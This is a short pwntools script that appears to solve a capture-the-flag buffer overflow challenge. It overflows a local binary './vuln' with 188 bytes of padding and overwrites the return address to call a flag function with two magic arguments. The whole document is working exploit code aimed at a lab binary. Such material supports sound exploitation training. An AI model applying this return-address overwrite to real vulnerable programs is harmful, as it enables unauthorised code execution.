from pwn import *

p = process('./vuln')

padding = b'a'*188
flag_fun = p32(0x080485e6)
exit_fun = p32(0x08048470)
arg1 = p32(0xDEADBEEF)
arg2 = p32(0xC0DED00D)

payload = b''
payload += padding
payload += flag_fun
payload += exit_fun
payload += arg1
payload += arg2

p.sendline(payload)
print(p.recvall())
